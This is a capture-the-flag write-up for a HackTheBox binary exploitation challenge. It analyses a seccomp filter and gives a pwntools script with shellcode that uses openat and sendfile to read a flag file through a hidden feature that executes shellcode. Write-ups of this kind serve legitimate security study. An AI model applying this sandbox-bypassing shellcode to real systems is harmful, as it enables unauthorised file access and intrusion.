# Fleet Management

We are given only the binary

Running `checksec`
```bash
gef➤  checksec
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

## Analysis
There is an interesting function in the binary called `beta_feature`. This function creates a heap memory with RWX permissions. Then, it reads shellcode from stdin and execute it.

The binary uses `seccomp` which only allows `rt_sigreturn`, `sendfile`, `exit`, `exit_group` and `openat`.
```bash
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
0005: 0x15 0x04 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010
0006: 0x15 0x03 0x00 0x00000028  if (A == sendfile) goto 0010
0007: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0010
0008: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0010
0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0011: 0x06 0x00 0x00 0x00000000  return KILL
```

So, we cannot do the typical open-read-write. However, we can do openat-sendfile. It is similar to open-read-write.

Issue: "flag.txt" is not in the binary

Solution: 
- Firstly, We can place the null byte on the stack.
```
xor rdx, rdx
push rdx
```
- Next, we place "flag.txt" (in little endian) on the stack. (Note: we cannot push the string directly on the stack. I think it is too large to be an instruction?)
```
mov rsi, 0x7478742e67616c66
push rsi
```
- So now, the "flag.txt" string is at the top of the stack (aka the value in RSP register points to the string). So, we can assign the value in RSP register to any register.
```
mov rsi, rsp
```

Note: `openat` (syscall 257) and `open` are equivalent. However, if we used relative path in `pathname` parameter for `openat`, the OS will open the file that is relative to the directory referred to by the `dirfd` parameter instead of the current working directory. If we want to use the current working directory for `openat`, our `dirfd` must be set to `AT_FDCWD` (-100). If success, it will return a new file descriptor.

Note: `sendfile` (syscall 40) copies data from file descriptor to another file descriptor. It can be used to replace the combination of `read` and `write`. In fact, it is more efficient as the copying is done within the kernel.

## Exploit
Idea: Place "flag.txt" string at the top of the stack. Open "flag.txt" using `openat`. Copies data from the new file descriptor to stdout using `sendfile`. 

```python
from pwn import *

context.arch = "amd64"

# Note: can mov 8 bytes of data, but cannot push 8 bytes of data
# AT_FDCWD (-100) - current directory

# shellcode:
# openat(AT_FDCWD, "flag.txt", 0) - open file with read only permission
# sendfile(1, 3, 0, 40)
shellcode = asm('''
        xor rdx, rdx
        push rdx
        mov rsi, 0x7478742e67616c66
        push rsi
        mov rsi, rsp
        mov rdi, -100 
        mov rax, 257
        syscall
        xor rdi, rdi
        inc rdi
        mov rsi, rax
        mov r10, 40 
        mov rax, 40
        syscall
        ''', arch="amd64")

# print(len(shellcode)) # has to be <= 60

elf = ELF('./fleet_management')
r = elf.process()
#r = remote('178.62.119.24', 30666)
#pause()
r.sendlineafter(b'What do you want to do?', b'9') # beta feature
r.sendline(shellcode)

r.interactive()
```

Flag: `HTB{backd00r_as_a_f3atur3}`